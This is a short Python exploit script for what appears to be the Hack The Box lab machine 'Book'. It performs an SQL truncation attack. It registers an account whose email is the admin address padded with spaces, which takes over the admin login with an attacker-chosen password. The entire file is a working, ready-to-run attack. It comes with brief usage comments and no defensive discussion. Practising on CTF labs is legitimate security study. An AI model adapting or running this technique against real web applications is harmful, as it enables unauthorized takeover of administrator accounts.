#!/usr/bin/python3

import requests

# Make sure to add 10.10.10.175 book.htb to your /etc/hosts/file
URL = "http://book.htb/index.php"
# Change the username to whatever you want
username = "Marlas"
# To create the admin user, e-mail portion must stay the same.  Must have at least 7 spaces and then whatever text you want at the end
email = "admin@book.htb           marlas"
# Change the password to whatever you want
password = "password123"

DATA = {"name" : username, "email" : email, "password" : password}

r = requests.post(url=URL, data=DATA)

print("SQL Truncation exploit complete")
print(f"Log into the admin panel (http://book.htb/admin) with {email.split(' ')[0]}:{password}")
